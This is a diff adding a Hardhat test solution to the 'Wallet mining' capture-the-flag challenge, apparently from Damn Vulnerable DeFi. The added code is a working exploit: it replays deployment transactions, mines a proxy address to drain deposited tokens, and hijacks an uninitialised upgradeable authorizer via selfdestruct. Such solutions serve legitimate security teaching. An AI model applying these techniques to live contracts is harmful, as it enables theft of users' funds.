@@ -66,6 +66,77 @@ describe('[Challenge] Wallet mining', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        /* 1. Deploy ProxyFactory and MasterCopy */
+
+        // Found EOA deployer3 (0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A) on etherscan that
+        // nonce1: Create Safe Mastercopy (0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F)
+        // nonce2: setImplementation
+        // nonce3: Create Proxy Factory (0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B)
+        await player.sendTransaction({
+            from: player.address,
+                to: "0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A",
+                value: ethers.utils.parseEther("1"),
+        });
+        const {
+            CreateMasterCopyRawTxData,
+            SetImplementationRawTxData,
+            CreateProxyFactoryRawTxData
+        } = require('./deployment.json');
+
+        const replayMasterCopy = await (await ethers.provider.sendTransaction(CreateMasterCopyRawTxData)).wait();
+        expect(replayMasterCopy.contractAddress).to.be.eq("0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F");
+
+        await (await ethers.provider.sendTransaction(SetImplementationRawTxData)).wait();
+
+        const replayProxyFactory = await (await ethers.provider.sendTransaction(CreateProxyFactoryRawTxData)).wait();
+        expect(replayProxyFactory.contractAddress).to.be.eq("0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B");
+
+        const proxyFactory = (
+            await ethers.getContractFactory("GnosisSafeProxyFactory")
+        ).attach(replayProxyFactory.contractAddress);
+
+        /* Wallet mining: deploy fakeSingleton (logic contract for safeProxy) & safeProxy */
+        const fakeSingleton = await (await ethers.getContractFactory("FakeSingleton", player)).deploy();
+        let safeProxy;
+        for (let i = 0; i < 100; i++) {
+            safeProxy = await proxyFactory.connect(player).createProxy(
+                fakeSingleton.address,
+                fakeSingleton.interface.encodeFunctionData(
+                    "drain", 
+                    [ token.address, player.address, ]
+                )
+            );
+            if (safeProxy.address == ethers.utils.getAddress(DEPOSIT_ADDRESS)) {  // valid checksum address
+                break;
+            }
+        }
+        expect(await token.balanceOf(DEPOSIT_ADDRESS)).to.eq(0);
+        expect(await token.balanceOf(player.address)).to.eq(DEPOSIT_TOKEN_AMOUNT);
+
+        /* Upgrade authorizer logic contract to fakeAuthorizer */
+        const _IMPLEMENTATION_SLOT = '0x' + (BigInt(ethers.utils.id('eip1967.proxy.implementation')) - BigInt(1)).toString(16);
+        const authorizerLogicAddr = ethers.utils.hexStripZeros(
+            await ethers.provider.getStorageAt(authorizer.address, _IMPLEMENTATION_SLOT)
+        );
+        const authorizerLogic = (
+            await ethers.getContractFactory("AuthorizerUpgradeable")
+        ).attach(authorizerLogicAddr);
+        // take over the authorizer logic contract since it has not been initialized
+        await authorizerLogic.connect(player).init([player.address], [token.address]);
+        const fakeAuthorizer = await (await ethers.getContractFactory("FakeAuthorizer", player)).deploy();
+        await authorizerLogic.connect(player).upgradeToAndCall(
+            fakeAuthorizer.address,
+            fakeAuthorizer.interface.encodeFunctionData(
+                "destroy",
+                [ player.address ]
+            )
+        )
+        // function walletDeploy.can(player.address, any.address) should now pass due to the destruction of the Authorizer logic contract
+        expect(await walletDeployer.can(player.address, "0xffffffffffffffffffffffffffffffffffffffff")).to.be.true;
+        for (let i = 0; i < 43; i++) {
+            await walletDeployer.connect(player).drop([]);
+        }
     });
 
     after(async function () {
